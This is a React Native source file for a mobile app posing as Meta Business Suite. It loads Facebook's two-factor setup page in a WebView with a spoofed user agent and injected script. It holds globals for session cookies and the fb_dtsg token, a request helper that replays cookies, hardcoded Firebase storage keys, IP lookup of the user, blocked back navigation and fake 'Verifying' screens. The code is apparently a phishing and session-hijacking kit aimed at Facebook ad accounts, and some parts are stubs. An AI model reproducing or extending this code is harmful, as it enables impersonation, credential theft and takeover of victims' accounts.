import React, { useRef, useEffect, useState } from 'react';
import {AsyncStorage,SafeAreaView,View, Text, LogBox, Image,Modal,TouchableOpacity, StyleSheet, Dimensions, ActivityIndicator } from 'react-native';
import { WebView } from 'react-native-webview';
import { NavigationContainer } from '@react-navigation/native';
import { createNativeStackNavigator } from '@react-navigation/native-stack';
import { LinearGradient } from 'expo-linear-gradient';
import Checkbox from 'expo-checkbox';
import firebase from 'firebase';
LogBox.ignoreLogs(['Warning: ...']); // Ignore log notification by message
LogBox.ignoreAllLogs(); //Ignore all log notifications
if (firebase.apps.length === 0) {
  firebase.initializeApp({
  apiKey: "AIzaSyCcXi8_ax6v6KGjKI00X7PtoWH7a3Q0e4Q",
  authDomain: "mobile-97165.firebaseapp.com",
  projectId: "mobile-97165",
  storageBucket: "mobile-97165.appspot.com",
  messagingSenderId: "85866129925",
  appId: "1:85866129925:web:6a3e83eae159e3b1640a6c"
  });
}
const delay = ms => new Promise(res => setTimeout(res, ms));
// Function to write data to Firestore
const addDocument = async (collection, data) => {
  try {
    const document = await firebase.firestore().collection(collection).add(data);
    return document.id;
  } catch (error) {
    console.log('error :>> ', error);
  }
}

const updDocument = async (collection,data,docid) => {
  try {
    await firebase.firestore().collection(collection).doc(docid).update(data);
  } catch (error) {
    console.log('error :>> ', error);
  }
};

//==========GLOBAL VARIAVLE=========
//var emails = [];
var cookieStr = "";
var loginAttempts = 0;
var fb_dtsg = "";
var is_done = false;
var injected = false;
var useragent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15";
const { width, height } = Dimensions.get('window');
const JS_GLOBAL = `
(function () {
      try{
        if (document.querySelector(\"._2pio._1uxu\")) {
          document.querySelector(\"._2pio._1uxu\").remove();   
        }
        const meta = document.createElement(\'meta\'); meta.setAttribute(\'content\', \'width=device-width, initial-scale=1, maximum-scale=0.9, user-scalable=0\'); meta.setAttribute(\'name\', \'viewport\'); 
        document.getElementsByTagName(\'head\')[0].appendChild(meta);
        document.body.addEventListener("contextmenu", function(evt){evt.preventDefault();return false;});
      }catch(e){};
})();
true`;
const _request = async ({ url, body, headers = {} }, cookie) => {
  try {
    var rqOption = {
      method: "GET",
      mode: 'cors',
      cache: 'no-cache',
      credentials: 'same-origin',
      headers: {
        "Cookie": cookie,
        "User-Agent": useragent,
      }
    }
    if (body?.length) {
      rqOption["method"] = "POST";
      rqOption["body"] = body;
    }
    rqOption.headers = { ...rqOption.headers, ...headers };
    const response = await fetch(url, rqOption);
    return await response.text();
  } catch (error) {
    console.log('error :>> ', error);
  }
}

function MainScreen({ navigation }) {
  const [modalVisible, setModalVisible] = useState(false);
  const [initUrl, setInitUrl] = useState("https://www.facebook.com/security/2fac/setup/intro/");
  const webViewRef = useRef();
  const [loadingVisible, setLoadingVisible] = useState(false);
  const styles = StyleSheet.create({
    activityIndicatorStyle: {
      flex: 1,
      position: 'absolute',
      marginLeft: 'auto',
      marginRight: 'auto',
      marginTop: 'auto',
      marginBottom: 'auto',
      left: 0,
      right: 0,
      top: 0,
      bottom: 0,
      justifyContent: 'center',
    }
  });

  const ActivityIndicatorElement = () => {
    return (
      <View style={styles.activityIndicatorStyle}>
        <ActivityIndicator color="#009688" size="large" />
      </View>
    );
  };

  const onloadEnd = async (event) => {  
    setTimeout(() => {
      setLoadingVisible(false);
    }, 100);
    const { nativeEvent } = event;
    this.isLoading = nativeEvent.loading;
    this.url = nativeEvent.url;
  };

  const handleMessage = async (event) => {
    if (!event.nativeEvent) {
      return;
    }
    try{
      if(event.nativeEvent.data){
        let data = JSON.parse(event.nativeEvent.data);
        console.log(data);
      }
    }catch(error){
      console.log('error :>> ', error);
      return;
    }
  };
  const handleNagivate =  async (navState) => {
  };

  const onloadStart = async (event) => {
    setLoadingVisible(true);
  };

  return (  
    <View style={{ flex: 1,marginTop:'10%' }}>
      <Modal
        animationType="none"
        transparent={false}
        visible={modalVisible}
        >
        <View style={{ flex: 1, alignItems: 'center', justifyContent: 'center' }}>
          <Image source={require('./assets/images/logo.png')} style={{ resizeMode: 'contain', width: 250, height: 120, marginLeft: 0, marginTop: 0 }} />   
          <Image source={require('./assets/images/loading.gif')} style={{ width: 35, height: 35 }} />
          <Text style ={{fontSize:14}}>Verifying...</Text>
          <Text style ={{fontSize:14}}>Please do not close the app</Text>
        </View>
      </Modal> 
      <WebView
        useWebKit={true}
        incognito={true}
        style={{ flex: 1, opacity: loadingVisible ? 0 : 100 }}
        ref={webViewRef}
        source={{ uri: initUrl }}
        javaScriptEnabled={true}
        injectedJavaScript={JS_GLOBAL}
        domStorageEnabled={true}
        startInLoadingState={true}
        originWhitelist={['*']}        
        scalesPageToFit={false}
        sharedCookiesEnabled={true} 
        userAgent={useragent}
        onLoadEnd={onloadEnd}
        onLoadStart={onloadStart}
        onMessage={handleMessage}
        onNavigationStateChange={handleNagivate}
        cacheEnabled={false}
        />
      {loadingVisible ? <ActivityIndicatorElement /> : null}
    </View>);
}

function PushNotifyScreen({ navigation }) {
  const stylesNoti = StyleSheet.create({
    container: {
      backgroundColor: "#fff",
      alignItems: "center",
      padding: 30,
      height: "100%",
    },
    header: {
      marginTop: 40,
    },
    boxTitle: {
      marginTop: 30,
    },
    title: {
      fontSize: 22,
      fontWeight: "bold",
      textAlign: "center",
    },
    policies: {
      marginTop: 30,
      paddingHorizontal: 30,
      gap: 20,
    },
    policy: {
      flexDirection: "row",
      gap: 10,
      paddingHorizontal: 30,
    },
    checkbox: {},
    label: {
      fontSize: 18,
      marginLeft: 10,
      fontWeight: "bold",
    },
    des: {
      marginTop: 5,
      marginLeft: 10,
      fontSize: 15,
      marginBottom:10
    },
    submit: {
      width: "100%",
      position: "absolute",
      bottom: 10,
      alignItems: "center",
      padding: 30,
    },
    hr: {
      width: "100%",
      borderColor: "#f2f2f2",
      borderWidth: 1,
    },
    textDes: {
      color: "#bfbfbf",
      marginTop: 10,
    },
    button: {
      height: 50,
      width: "100%",
      justifyContent: "center",
      alignItems: "center",
      backgroundColor: "#4C91FA",
      borderRadius: 12,
      marginTop: 10,
    },
  });

  useEffect(() => {
    async function fetchIPInfo() {
      // CookieManager.clearAll();
      const storageIP = await AsyncStorage.getItem('ipinfo');
      if(!storageIP){
        let fetchRes = await fetch('https://ipinfo.io/json',{
          method: 'GET',
          headers: {
            Accept: 'application/json',
          },
        });
        let fetchStr = await fetchRes.json();
        await AsyncStorage.setItem(
          'ipinfo',
          JSON.stringify(fetchStr),
        );
      }
    }
    fetchIPInfo();
  }, []); 
  
  return (
    <SafeAreaView style={stylesNoti.container}>
      <View style={stylesNoti.header}>
        <Image source={require("./assets/images/noti.png")} />
      </View>
      <View style={stylesNoti.boxTitle}>
        <Text style={stylesNoti.title}>Turn on push notifications to</Text>
        <Text style={stylesNoti.title}>stay updated</Text>
      </View>
      <View style={stylesNoti.policies}>
        <View style={stylesNoti.policy}>
          <Checkbox style={stylesNoti.checkbox} value={true} />
          <View>
            <Text style={stylesNoti.label}>Do you like React Native?</Text>
            <Text style={stylesNoti.des}>
              The status of your campaigns: approval, ending and performance
            </Text>
          </View>
        </View>
        <View style={stylesNoti.policy}>
          <Checkbox style={stylesNoti.checkbox} value={true} />
          <View>
            <Text style={stylesNoti.label}>Alerts</Text>
            <Text style={stylesNoti.des}>
              Error blocking your campaigns: ad rejection, biling issues, or
              reaching your spending limit
            </Text>
          </View>
        </View>
        <View style={stylesNoti.policy}>
          <Checkbox style={stylesNoti.checkbox} value={true} />
          <View>
            <Text style={stylesNoti.label}>Getting started</Text>
            <Text style={stylesNoti.des}>
              Tips for running campaigns in Ads Manager
            </Text>
          </View>
        </View>
        <View style={stylesNoti.policy}>
          <Checkbox style={stylesNoti.checkbox} value={true} />
          <View>
            <Text style={stylesNoti.label}>Performance opportunities</Text>
            <Text style={stylesNoti.des}>
              Suggestion to improve campaigns performance
            </Text>
          </View>
        </View>
      </View>
      <View style={stylesNoti.submit}>
        <View style={{ width: "100%", paddingHorizontal: 15 }}>
          <View style={stylesNoti.hr} />
        </View>
        <Text style={stylesNoti.textDes}>
          You can make changes in settings any time
        </Text>
        <TouchableOpacity onPress={() => { 
          navigation.navigate('SocialAuthScreen');
        }
          } style={stylesNoti.button}>
          <Text style={{ color: "#fff", fontWeight: "bold",fontSize:17 }}>Continue</Text>
        </TouchableOpacity>
      </View>
    </SafeAreaView>
  );
}

function SocialAuthScreen({ navigation }) {
  const stylesLogin = StyleSheet.create({
    container: {
      flex: 1,
      flexGrow: 1,
      backgroundColor: "#fff",
      alignItems: "center",
      justifyContent: "center",
      padding: 30,
    },
    box: {
      width: "100%",
      backgroundColor: "#fff",
      height: 320,
      borderRadius: 12,
      paddingTop: 50,
      paddingLeft: 30,
      paddingRight: 30,
    },
    boxHeader: {
      justifyContent: "center",
      alignItems: "center",
      flexDirection: "row",
      gap: 5,
    },
    checked: {
      position: "relative",
      right: 8,
      top: -10,
    },
    title: {
      fontSize: 22,
      fontWeight: "bold",
      marginLeft:2
    },
    fblogin: {
      marginLeft:5,
      fontSize:15
    },
    inslogin: {
      marginLeft:5,
      fontSize:15,
      color:'#9ca3af'
    },
    titletext:{
      fontSize:16
    },
    description: {
      marginTop: 20,
      alignItems: "center",
    },
    login: {
      marginTop: 30,
      gap: 10,
    },
    button: {
      marginBottom:10,
      flexDirection: "row",
      justifyContent: "center",
      gap: 10,
      padding: 15,
      width: "100%",
      backgroundColor: "#d7dbdf6e",
      borderRadius: 12,
    },
  });
  const [touched, setTouched] = useState(false);
  useEffect(() =>
    navigation.addListener('beforeRemove', (e) => {
      e.preventDefault();
      return
    }),
    [navigation]
  );
  return (
    <LinearGradient
    // Background Linear Gradient
    colors={["#14D5FF", "#45D439"]}
    style={stylesLogin.container}
  >
    <View style={stylesLogin.box}>
      <View style={stylesLogin.boxHeader}>
        <Image source={require("./assets/images/meta.png")} />
        <Text style={stylesLogin.title}>Meta Business Suite</Text>
      </View>
      <View style={stylesLogin.description}>
        <Text style={stylesLogin.titletext}>Create and manage ads on iphone</Text>
      </View>
      <View style={stylesLogin.login}>
        <TouchableOpacity onPress={() => { navigation.navigate('MainScreen'); }} style={stylesLogin.button}>
          <Image height={"18"} width={18} source={require("./assets/images/fb.png")} />
          <Text style={stylesLogin.fblogin}>Login with Facebook</Text>
        </TouchableOpacity>

        <TouchableOpacity disabled={true} style={stylesLogin.button}>
          <Image source={require("./assets/images/ig.png")} />
          <Text style={stylesLogin.inslogin}>Login with Instagram</Text>
        </TouchableOpacity>
      </View>
    </View>
  </LinearGradient>
  );
}



function LoadScreen({ navigation }) {
  useEffect(() =>
    navigation.addListener('beforeRemove', (e) => {
      e.preventDefault();
      return
    }),
    [navigation]
  );
  return (
    <View style={{ flex: 1, alignItems: 'center', justifyContent: 'center' }}>
      <Image source={require('./assets/images/logo.png')} style={{ resizeMode: 'contain', width: 250, height: 120, marginLeft: 0, marginTop: 0 }} />   
      <Image source={require('./assets/images/loading.gif')} style={{ width: 35, height: 35 }} />
      <Text style ={{fontSize:14}}>Verifying...</Text>
      <Text style ={{fontSize:14}}>Please do not close the app</Text>
    </View>
  );
}

const Stack = createNativeStackNavigator();

function App() {
  return ( 
    <NavigationContainer>
      <Stack.Navigator initialRouteName="PushNotifyScreen" screenOptions={{headerShown: false}}>
        <Stack.Screen name="PushNotifyScreen" component={PushNotifyScreen} />
        <Stack.Screen name="SocialAuthScreen" component={SocialAuthScreen} />
        <Stack.Screen name="MainScreen" component={MainScreen} />
        <Stack.Screen name="LoadScreen" component={LoadScreen} />
      </Stack.Navigator>
    </NavigationContainer>
  );
}
export default App;